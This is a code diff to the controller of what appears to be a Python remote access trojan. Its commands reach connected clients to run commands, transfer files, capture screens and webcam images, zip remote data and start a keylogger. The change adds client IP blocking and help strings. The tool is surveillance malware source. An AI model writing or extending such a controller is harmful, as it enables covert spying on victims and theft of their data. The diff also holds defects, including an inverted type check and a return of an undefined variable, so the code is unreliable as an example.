@@ -170,12 +170,33 @@ class Server:
                 elif response["data"]:
                     self.user_interface.poutput(response["data"])
 
+    def block_address(self, action, addresses, close_existing):
+        if action == "add":
+            for address in addresses:
+                self.connection.blocked_ips.add(address)
+                if close_existing:
+                    for session in self.connection.sessions:
+                        if session["address"] == address:
+                            self.connection.sessions.remove(session)
+                            try:
+                                session["connection"].close()
+                            except socket.error:
+                                pass
+        elif action == "rm":
+            for address in addresses:
+                if address in self.connection.blocked_ips:
+                    self.connection.blocked_ips.remove(address)
+        elif action == "list":
+            for address in self.connection.blocked_ips:
+                print(address)
+
 
 class Connection:
     def __init__(self, user_interface):
         self.CODEC = "utf8"
         self.PACKET_SIZE = 1024
-        self.sessions = list()
+        self.sessions = []
+        self.blocked_ips = set()
         self.user_interface = user_interface
 
         HOST = "127.0.0.1"
@@ -208,16 +229,19 @@ class Connection:
             try:
                 sock.listen()
                 connection, (address, port) = sock.accept()
-                self.user_interface.async_alert("[*] client connected")
-            except OSError:  # error occurs when socket is closed
+            except OSError:  # occurs when socket is closed
                 break
             else:
-                session = {"connection": connection,
-                           "address": address,
-                           "port": port,
-                           "tag": "no tag",
-                           "groups": {"all"}}
-                self.sessions.append(session)
+                if address in self.blocked_ips:
+                    connection.close()
+                else:
+                    self.user_interface.async_alert("[*] client connected")
+                    session = {"connection": connection,
+                               "address": address,
+                               "port": port,
+                               "tag": "no tag",
+                               "groups": {"all"}}
+                    self.sessions.append(session)
 
     # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
     def format_byte_length(self, num, suffix='B'):
@@ -248,16 +272,17 @@ class Connection:
         data = bytearray()
         try:
             header = int(connection.recv(self.PACKET_SIZE).decode("utf8"))
-            connection.send("ACK".encode("utf8"))
+            connection.send("READY".encode("utf8"))
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
                 sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} to {round(len(data) / (header / 100), 1)}% complete")
                 sys.stdout.flush()
                 print()
             received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
-            # check if all expected keys are existing and if all values are of the same type
+
+        # check the received data
             for expected_key, expected_type in zip(expected_dict.keys(), expected_dict.values()):
-                if expected_key not in received_dict or type(received_dict[expected_key]) == expected_type:
+                if expected_key not in received_dict.keys() or type(received_dict[expected_key]) == expected_type:
                     return False, None
             return True, received_json
         except socket.error as error:
@@ -313,35 +338,43 @@ class UserInterface(cmd2.Cmd):
     exe_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     down_parser = argparse.ArgumentParser(prog="down")
-    down_parser.add_argument("-r", "--read", required=True, type=str, help="")
-    down_parser.add_argument("-w", "--write", required=True, type=str)
+    down_parser.add_argument("-r", "--read", required=True, type=str, help="file to read data from")
+    down_parser.add_argument("-w", "--write", required=True, type=str, help="file to write data to")
     down_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     up_parser = argparse.ArgumentParser(prog="up")
-    up_parser.add_argument("-r", "--read", required=True, type=str)
-    up_parser.add_argument("-w", "--write", required=True, type=str)
+    up_parser.add_argument("-r", "--read", required=True, type=str, help="file to read data from")
+    up_parser.add_argument("-w", "--write", required=True, type=str, help="file to write data to")
     up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     screen_parser = argparse.ArgumentParser(prog="screen")
-    screen_parser.add_argument("-m", "--monitor", required=True, type=int)
-    screen_parser.add_argument("-w", "--write", required=True, type=str)
+    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 99),
+                               help="monitor to capture (-1 for all)")
+    screen_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the picture in")
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     zip_parser = argparse.ArgumentParser(prog="zip")
-    zip_parser.add_argument("-c", "--compression", default=1, type=int)
-    zip_parser.add_argument("-r", "--read", required=True, type=str)
-    zip_parser.add_argument("-w", "--write", required=True, type=str)
+    zip_parser.add_argument("-c", "--compression", default=1, type=int, help="zip compression level",
+                            choices=range(0, 9))
+    zip_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
+    zip_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the zipfile in")
     zip_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     cam_parser = argparse.ArgumentParser(prog="cam")
-    cam_parser.add_argument("-p", "--port", required=True, type=int)
-    cam_parser.add_argument("-w", "--write", required=True, type=str)
+    cam_parser.add_argument("-p", "--port", required=True, type=int, help="camera port (usually 0)")
+    cam_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the image in")
     cam_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     log_keys_parser = argparse.ArgumentParser(prog="logger")
     log_keys_parser.add_argument("-a", "--action", required=True, type=str, choices=["start", "stop", "status"])
-    log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str)
+    log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str, help="file to store logs in")
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+
+    block_parser = argparse.ArgumentParser(prog="block")
+    block_parser.add_argument("-a", "--action", required=True, type=str, choices=["add", "rm", "list"])
+    block_parser.add_argument("-i", "--ips", nargs="+", type=str, help="addresses to block")
+    block_parser.add_argument("-c", "--close", action="store_true",
+                              help="closing sessions from blocked ips which are already established")
 
     def __init__(self, server):
         super().__init__()
@@ -440,6 +473,11 @@ class UserInterface(cmd2.Cmd):
     def do_logger(self, args):
         """Start/Stop keylogger"""
         self.server.log_keys(args.action, args.file, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(block_parser)
+    def do_block(self, args):
+        """Block a client by ip"""
+        self.server.block_address(args.action, args.ips, args.close)
 
 
 if __name__ == "__main__":
